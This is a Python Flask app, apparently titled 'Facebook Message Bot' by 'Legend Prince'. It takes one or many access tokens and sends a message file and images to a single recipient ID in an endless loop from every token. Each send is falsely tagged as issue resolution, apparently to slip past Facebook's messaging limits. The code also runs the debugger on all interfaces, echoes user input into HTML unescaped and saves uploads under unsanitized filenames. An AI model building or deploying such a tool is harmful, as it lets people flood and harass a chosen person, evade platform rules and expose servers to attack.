from flask import Flask, request, render_template_string, jsonify
import requests
from threading import Thread, Event
import time
import random
import string
import os
import json

app = Flask(__name__)
app.debug = True

# Create directories if they don't exist
if not os.path.exists('uploads'):
    os.makedirs('uploads')

# Global variables
stop_events = {}
threads = {}
task_status = {}

def get_page_access_token(user_token, page_id):
    """Get page access token from user token"""
    try:
        url = f"https://graph.facebook.com/v22.0/me/accounts"
        params = {'access_token': user_token}
        response = requests.get(url, params=params)
        
        if response.status_code == 200:
            pages = response.json().get('data', [])
            for page in pages:
                if page['id'] == page_id:
                    return page['access_token']
        return None
    except Exception as e:
        print(f"Error getting page token: {e}")
        return None

def test_token(access_token):
    """Test if token is valid"""
    try:
        url = "https://graph.facebook.com/v22.0/me"
        params = {'access_token': access_token}
        response = requests.get(url, params=params)
        return response.status_code == 200
    except:
        return False

def send_message_simple(access_token, recipient_id, message):
    """Simple message sending method"""
    try:
        url = "https://graph.facebook.com/v22.0/me/messages"
        
        payload = {
            'recipient': json.dumps({'id': recipient_id}),
            'message': json.dumps({'text': message}),
            'access_token': access_token,
            'messaging_type': 'MESSAGE_TAG',
            'tag': 'ISSUE_RESOLUTION'
        }
        
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        
        response = requests.post(url, data=payload, headers=headers)
        result = response.json()
        
        if response.status_code == 200:
            return True, "Message sent successfully"
        else:
            error_msg = result.get('error', {}).get('message', 'Unknown error')
            return False, error_msg
            
    except Exception as e:
        return False, f"Error: {str(e)}"

def send_image_simple(access_token, recipient_id, image_url):
    """Simple image sending method"""
    try:
        url = "https://graph.facebook.com/v22.0/me/messages"
        
        payload = {
            'recipient': json.dumps({'id': recipient_id}),
            'message': json.dumps({
                'attachment': {
                    'type': 'image',
                    'payload': {'url': image_url, 'is_reusable': True}
                }
            }),
            'access_token': access_token,
            'messaging_type': 'MESSAGE_TAG',
            'tag': 'ISSUE_RESOLUTION'
        }
        
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        
        response = requests.post(url, data=payload, headers=headers)
        result = response.json()
        
        if response.status_code == 200:
            return True, "Image sent successfully"
        else:
            error_msg = result.get('error', {}).get('message', 'Unknown error')
            return False, error_msg
            
    except Exception as e:
        return False, f"Error: {str(e)}"

def upload_image_and_get_url(access_token, image_path):
    """Upload image to Facebook and get URL"""
    try:
        # First method: Direct upload
        upload_url = "https://graph.facebook.com/v22.0/me/message_attachments"
        
        with open(image_path, 'rb') as img_file:
            files = {
                'filedata': (os.path.basename(image_path), img_file, 'image/jpeg')
            }
            data = {
                'access_token': access_token,
                'message': '{"attachment_type":"image"}'
            }
            
            response = requests.post(upload_url, files=files, data=data)
            
            if response.status_code == 200:
                result = response.json()
                attachment_id = result.get('attachment_id')
                
                # Get the URL from attachment
                url = f"https://www.facebook.com/attachment/{attachment_id}"
                return True, url
            else:
                return False, f"Upload failed: {response.text}"
                
    except Exception as e:
        return False, f"Upload error: {str(e)}"

def send_messages(access_tokens, thread_id, mn, time_interval, messages, image_files, task_id):
    """Main function to send messages and images"""
    stop_event = stop_events[task_id]
    task_status[task_id] = {'running': True, 'sent_messages': 0, 'sent_images': 0}
    
    # Clean thread ID
    clean_thread_id = thread_id.replace('t_', '') if thread_id.startswith('t_') else thread_id
    
    # Filter valid tokens
    valid_tokens = []
    for token in access_tokens:
        token = token.strip()
        if token and len(token) > 50:  # Basic token validation
            if test_token(token):
                valid_tokens.append(token)
                print(f"✅ Valid token found: {token[:20]}...")
            else:
                print(f"❌ Invalid token: {token[:20]}...")
        else:
            print(f"❌ Invalid token format")
    
    if not valid_tokens:
        print("❌ No valid tokens available!")
        task_status[task_id]['running'] = False
        return
    
    print(f"🚀 Starting task with {len(valid_tokens)} tokens, {len(messages)} messages, {len(image_files)} images")
    
    # Prepare image URLs (upload images first)
    image_urls = []
    if image_files:
        print("📤 Uploading images...")
        for token in valid_tokens[:1]:  # Use first token for uploads
            for image_file in image_files:
                image_path = os.path.join('uploads', image_file)
                if os.path.exists(image_path):
                    success, url = upload_image_and_get_url(token, image_path)
                    if success:
                        image_urls.append(url)
                        print(f"✅ Image uploaded: {image_file}")
                    else:
                        print(f"❌ Image upload failed: {image_file}")
            break  # Only use first token for uploads
    
    cycle_count = 0
    
    while not stop_event.is_set():
        cycle_count += 1
        print(f"🔄 Starting cycle {cycle_count}")
        
        for message_index, message_text in enumerate(messages):
            if stop_event.is_set():
                break
                
            # Send message from each token
            for token_index, token in enumerate(valid_tokens):
                if stop_event.is_set():
                    break
                    
                full_message = f"{mn} {message_text}"
                success, result = send_message_simple(token, clean_thread_id, full_message)
                
                if success:
                    task_status[task_id]['sent_messages'] += 1
                    print(f"✅ [{task_status[task_id]['sent_messages']}] Message sent via Token {token_index + 1}: {full_message[:30]}...")
                else:
                    print(f"❌ Message failed (Token {token_index + 1}): {result}")
                
                time.sleep(time_interval)
            
            # Send image after each message if images available
            if image_urls and not stop_event.is_set():
                for token_index, token in enumerate(valid_tokens):
                    if stop_event.is_set():
                        break
                        
                    image_url = random.choice(image_urls)
                    success, result = send_image_simple(token, clean_thread_id, image_url)
                    
                    if success:
                        task_status[task_id]['sent_images'] += 1
                        print(f"🖼️ [{task_status[task_id]['sent_images']}] Image sent via Token {token_index + 1}")
                    else:
                        print(f"❌ Image failed (Token {token_index + 1}): {result}")
                    
                    time.sleep(time_interval)
    
    task_status[task_id]['running'] = False
    print(f"🛑 Task {task_id} stopped")

@app.route('/')
def home():
    return render_template_string('''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🚀 Facebook Message Bot - Legend Prince</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root {
            --primary: #667eea;
            --secondary: #764ba2;
            --success: #28a745;
            --danger: #dc3545;
        }
        
        body {
            background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
            min-height: 100vh;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        .glass-card {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            border: 1px solid rgba(255, 255, 255, 0.2);
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
        }
        
        .header-gradient {
            background: linear-gradient(45deg, var(--primary), var(--secondary));
            color: white;
        }
        
        .btn-gradient {
            background: linear-gradient(45deg, var(--primary), var(--secondary));
            border: none;
            color: white;
            font-weight: 600;
            transition: all 0.3s ease;
        }
        
        .btn-gradient:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
        }
        
        .form-control {
            border-radius: 10px;
            border: 2px solid #e9ecef;
            transition: all 0.3s ease;
        }
        
        .form-control:focus {
            border-color: var(--primary);
            box-shadow: 0 0 0 0.2rem rgba(102, 126, 234, 0.25);
        }
        
        .preview-img {
            width: 80px;
            height: 80px;
            object-fit: cover;
            border-radius: 10px;
            margin: 5px;
            border: 2px solid var(--primary);
        }
        
        .status-badge {
            background: var(--success);
            color: white;
            padding: 5px 10px;
            border-radius: 20px;
            font-size: 12px;
        }
        
        .feature-icon {
            font-size: 2rem;
            color: var(--primary);
            margin-bottom: 1rem;
        }
    </style>
</head>
<body>
    <div class="container py-5">
        <!-- Header -->
        <div class="text-center text-white mb-5">
            <h1 class="display-4 fw-bold"><i class="fas fa-robot"></i> Facebook Message Bot</h1>
            <p class="lead">Automatically send messages and images to Facebook conversations</p>
        </div>

        <div class="row justify-content-center">
            <div class="col-lg-8">
                <div class="glass-card p-4 mb-4">
                    <!-- Features -->
                    <div class="row text-center mb-4">
                        <div class="col-md-3">
                            <div class="feature-icon">
                                <i class="fas fa-comment-dots"></i>
                            </div>
                            <h6>Auto Messages</h6>
                        </div>
                        <div class="col-md-3">
                            <div class="feature-icon">
                                <i class="fas fa-image"></i>
                            </div>
                            <h6>Image Support</h6>
                        </div>
                        <div class="col-md-3">
                            <div class="feature-icon">
                                <i class="fas fa-bolt"></i>
                            </div>
                            <h6>Fast & Reliable</h6>
                        </div>
                        <div class="col-md-3">
                            <div class="feature-icon">
                                <i class="fas fa-shield-alt"></i>
                            </div>
                            <h6>Secure</h6>
                        </div>
                    </div>

                    <!-- Main Form -->
                    <form method="post" action="/start" enctype="multipart/form-data" id="mainForm">
                        <!-- Token Section -->
                        <div class="mb-4">
                            <label class="form-label fw-bold">🔑 Access Tokens</label>
                            <select class="form-select mb-3" name="tokenOption" id="tokenOption" onchange="toggleTokenInput()">
                                <option value="single">Single Token</option>
                                <option value="multiple">Multiple Tokens</option>
                            </select>
                            
                            <div id="singleTokenInput">
                                <input type="text" class="form-control" name="singleToken" 
                                       placeholder="Enter Facebook Access Token (EAAB...)" required>
                                <div class="form-text">
                                    <i class="fas fa-info-circle"></i> Get token from 
                                    <a href="https://developers.facebook.com/tools/explorer/" target="_blank">Facebook Graph API Explorer</a>
                                </div>
                            </div>
                            
                            <div id="tokenFileInput" style="display: none;">
                                <input type="file" class="form-control" name="tokenFile" accept=".txt">
                                <div class="form-text">
                                    <i class="fas fa-file-alt"></i> Upload .txt file with one token per line
                                </div>
                            </div>
                        </div>

                        <!-- Recipient Info -->
                        <div class="mb-4">
                            <label class="form-label fw-bold">👥 Recipient Information</label>
                            <input type="text" class="form-control mb-3" name="threadId" 
                                   placeholder="Recipient Facebook ID (e.g., 123456789)" required>
                            <input type="text" class="form-control" name="kidx" 
                                   placeholder="Your Name (will be added before each message)" required>
                        </div>

                        <!-- Timing -->
                        <div class="mb-4">
                            <label class="form-label fw-bold">⏰ Timing Settings</label>
                            <input type="number" class="form-control" name="time" value="3" min="1" max="10" required>
                            <div class="form-text">Delay in seconds between messages</div>
                        </div>

                        <!-- Messages File -->
                        <div class="mb-4">
                            <label class="form-label fw-bold">💬 Messages File</label>
                            <input type="file" class="form-control" name="txtFile" accept=".txt" required>
                            <div class="form-text">
                                <i class="fas fa-file-text"></i> .txt file with one message per line
                            </div>
                        </div>

                        <!-- Images -->
                        <div class="mb-4">
                            <label class="form-label fw-bold">🖼️ Images (Optional)</label>
                            <input type="file" class="form-control" id="imageFiles" name="imageFiles" multiple accept="image/*">
                            <div class="form-text">
                                <i class="fas fa-images"></i> Select multiple images to send after each message
                            </div>
                            <div id="imagePreview" class="mt-3"></div>
                        </div>

                        <button type="submit" class="btn btn-gradient btn-lg w-100 py-3" id="submitBtn">
                            <i class="fas fa-rocket"></i> START SENDING MESSAGES
                        </button>
                    </form>

                    <!-- Stop Form -->
                    <form method="post" action="/stop" class="mt-4">
                        <div class="mb-3">
                            <label class="form-label fw-bold">🛑 Stop Task</label>
                            <input type="text" class="form-control" name="taskId" placeholder="Enter Task ID to stop" required>
                        </div>
                        <button type="submit" class="btn btn-danger w-100 py-2">
                            <i class="fas fa-stop"></i> STOP TASK
                        </button>
                    </form>
                </div>

                <!-- Instructions -->
                <div class="glass-card p-4">
                    <h5 class="fw-bold mb-3"><i class="fas fa-book"></i> How to Use:</h5>
                    <ol>
                        <li>Get Facebook Access Token from Graph API Explorer</li>
                        <li>Enter recipient's Facebook ID</li>
                        <li>Upload messages file (.txt format)</li>
                        <li>Add images if needed (optional)</li>
                        <li>Set delay time and click START</li>
                        <li>Use Task ID to stop when needed</li>
                    </ol>
                    
                    <div class="alert alert-info">
                        <i class="fas fa-lightbulb"></i> 
                        <strong>Pro Tip:</strong> Use Page Access Tokens for better reliability
                    </div>
                </div>

                <!-- Footer -->
                <div class="text-center text-white mt-4">
                    <p>© 2024 Developed by <strong>Legend Prince</strong></p>
                    <div>
                        <a href="https://www.facebook.com/100064267823693" class="text-white me-3">
                            <i class="fab fa-facebook"></i> Facebook
                        </a>
                        <a href="https://wa.me/+917543864229" class="text-white">
                            <i class="fab fa-whatsapp"></i> WhatsApp
                        </a>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        function toggleTokenInput() {
            const option = document.getElementById('tokenOption').value;
            document.getElementById('singleTokenInput').style.display = 
                option === 'single' ? 'block' : 'none';
            document.getElementById('tokenFileInput').style.display = 
                option === 'multiple' ? 'block' : 'none';
            
            // Update required attributes
            document.querySelector('[name="singleToken"]').required = option === 'single';
            document.querySelector('[name="tokenFile"]').required = option === 'multiple';
        }

        // Image preview
        document.getElementById('imageFiles').addEventListener('change', function(e) {
            const preview = document.getElementById('imagePreview');
            preview.innerHTML = '';
            
            Array.from(this.files).forEach(file => {
                if (file.type.startsWith('image/')) {
                    const reader = new FileReader();
                    reader.onload = function(e) {
                        const img = document.createElement('img');
                        img.src = e.target.result;
                        img.className = 'preview-img';
                        preview.appendChild(img);
                    }
                    reader.readAsDataURL(file);
                }
            });
        });

        // Form submission
        document.getElementById('mainForm').addEventListener('submit', function() {
            const btn = document.getElementById('submitBtn');
            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> STARTING...';
            btn.disabled = true;
        });

        // Initialize
        document.addEventListener('DOMContentLoaded', function() {
            toggleTokenInput();
        });
    </script>
</body>
</html>
''')

@app.route('/start', methods=['POST'])
def start_task():
    try:
        # Get form data
        token_option = request.form.get('tokenOption', 'single')
        
        # Handle tokens
        if token_option == 'single':
            single_token = request.form.get('singleToken', '').strip()
            access_tokens = [single_token] if single_token else []
        else:
            token_file = request.files.get('tokenFile')
            if token_file and token_file.filename:
                access_tokens = token_file.read().decode('utf-8').strip().split('\n')
                access_tokens = [t.strip() for t in access_tokens if t.strip()]
            else:
                access_tokens = []
        
        if not access_tokens:
            return '''
            <div class="alert alert-danger text-center">
                <h4>❌ Error</h4>
                <p>Please provide valid access tokens</p>
                <a href="/" class="btn btn-primary">← Go Back</a>
            </div>
            '''
        
        # Get other data
        thread_id = request.form.get('threadId', '').strip()
        if not thread_id:
            return '''
            <div class="alert alert-danger text-center">
                <h4>❌ Error</h4>
                <p>Please provide Recipient ID</p>
                <a href="/" class="btn btn-primary">← Go Back</a>
            </div>
            '''
        
        kidx = request.form.get('kidx', '').strip()
        if not kidx:
            return '''
            <div class="alert alert-danger text-center">
                <h4>❌ Error</h4>
                <p>Please provide your name</p>
                <a href="/" class="btn btn-primary">← Go Back</a>
            </div>
            '''
        
        try:
            time_interval = max(1, min(10, int(request.form.get('time', 3))))
        except:
            time_interval = 3
        
        # Handle messages file
        txt_file = request.files.get('txtFile')
        if not txt_file or not txt_file.filename:
            return '''
            <div class="alert alert-danger text-center">
                <h4>❌ Error</h4>
                <p>Please provide a messages file</p>
                <a href="/" class="btn btn-primary">← Go Back</a>
            </div>
            '''
        
        messages = txt_file.read().decode('utf-8').strip().split('\n')
        messages = [m.strip() for m in messages if m.strip()]
        
        if not messages:
            return '''
            <div class="alert alert-danger text-center">
                <h4>❌ Error</h4>
                <p>No valid messages found in the file</p>
                <a href="/" class="btn btn-primary">← Go Back</a>
            </div>
            '''
        
        # Handle images
        image_files = []
        uploaded_images = request.files.getlist('imageFiles')
        for image in uploaded_images:
            if image and image.filename:
                filename = f"{int(time.time())}_{random.randint(1000,9999)}_{image.filename}"
                filepath = os.path.join('uploads', filename)
                image.save(filepath)
                image_files.append(filename)
        
        # Create task
        task_id = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
        stop_events[task_id] = Event()
        
        # Start thread
        thread = Thread(
            target=send_messages,
            args=(access_tokens, thread_id, kidx, time_interval, messages, image_files, task_id),
            daemon=True
        )
        threads[task_id] = thread
        thread.start()
        
        return f'''
        <div class="container py-5">
            <div class="glass-card p-5 text-center">
                <div class="mb-4">
                    <i class="fas fa-check-circle text-success" style="font-size: 4rem;"></i>
                </div>
                <h2 class="text-success mb-4">✅ Task Started Successfully!</h2>
                
                <div class="row text-start mb-4">
                    <div class="col-md-6">
                        <p><strong>Task ID:</strong> <code>{task_id}</code></p>
                        <p><strong>Tokens:</strong> {len(access_tokens)}</p>
                        <p><strong>Messages:</strong> {len(messages)}</p>
                    </div>
                    <div class="col-md-6">
                        <p><strong>Images:</strong> {len(image_files)}</p>
                        <p><strong>Interval:</strong> {time_interval} seconds</p>
                        <p><strong>Status:</strong> <span class="status-badge">RUNNING</span></p>
                    </div>
                </div>
                
                <div class="alert alert-info">
                    <i class="fas fa-info-circle"></i>
                    <strong>Keep this page open</strong> to see console logs. Use the Task ID to stop this task.
                </div>
                
                <a href="/" class="btn btn-gradient btn-lg">
                    <i class="fas fa-home"></i> Back to Home
                </a>
            </div>
        </div>
        '''
        
    except Exception as e:
        return f'''
        <div class="alert alert-danger text-center">
            <h4>❌ Error</h4>
            <p>{str(e)}</p>
            <a href="/" class="btn btn-primary">← Go Back</a>
        </div>
        '''

@app.route('/stop', methods=['POST'])
def stop_task():
    task_id = request.form.get('taskId', '').strip().upper()
    if task_id in stop_events:
        stop_events[task_id].set()
        time.sleep(1)
        if task_id in threads:
            del threads[task_id]
        if task_id in stop_events:
            del stop_events[task_id]
        if task_id in task_status:
            del task_status[task_id]
        
        return '''
        <div class="alert alert-success text-center">
            <h4>✅ Task Stopped</h4>
            <p>Task ''' + task_id + ''' has been stopped successfully!</p>
            <a href="/" class="btn btn-primary">← Go Back</a>
        </div>
        '''
    else:
        return '''
        <div class="alert alert-warning text-center">
            <h4>⚠️ Task Not Found</h4>
            <p>Task ''' + task_id + ''' not found or already stopped</p>
            <a href="/" class="btn btn-primary">← Go Back</a>
        </div>
        '''

@app.route('/status/<task_id>')
def get_status(task_id):
    if task_id in task_status:
        return jsonify(task_status[task_id])
    else:
        return jsonify({'error': 'Task not found'})

if __name__ == '__main__':
    print("🚀 Facebook Message Bot Starting...")
    print("📧 Server running on http://0.0.0.0:5000")
    app.run(host='0.0.0.0', port=5000, debug=True)
